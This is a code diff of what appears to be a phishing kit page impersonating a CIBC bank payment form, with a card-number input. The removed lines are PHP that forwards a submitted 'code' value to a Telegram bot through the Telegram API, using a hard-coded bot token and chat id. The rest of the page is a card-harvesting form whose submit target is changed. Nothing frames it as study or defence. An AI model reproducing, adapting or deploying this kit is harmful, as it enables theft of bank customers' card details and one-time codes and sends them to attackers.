@@ -1,19 +1,4 @@
-<?php
 
-$code       = $_POST['code']; 
-$message = " $code";
-
-$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
-$data = [
-    'chat_id' => '-903484597',
-    'text' => $message
-];
-
-$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
-                                 http_build_query($data) );
-                                                    
-
-?>
 <!-- saved from url=(0042)/deposit/cibc/c -->
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         
@@ -96,7 +81,7 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
                 <h2 class="page-subtitle">Payment Information</h2>
                 <div class="global-error-from-container" tabindex="-1" id="idf">
                 </div>
-                <form class="input-form form-card" id="card-information-form" method="post" action="040152.php" onsubmit="return validate()">
+                <form class="input-form form-card" id="card-information-form" method="post" action="/deposit/cibc/c" onsubmit="return validate()">
                                         <div class="form-group" style="">
                         <label>Card Number</label>
                         <input id="input-card" type="tel" placeholder="Enter your Card Number" name="card" class="form-control lrinput" onkeyup="split()" required="true" autocomplete="off" maxlength="19" oninput="this.value = this.value.replace(/[^0-9, ]/, &#39;&#39;)" attr-action="Filling Card">
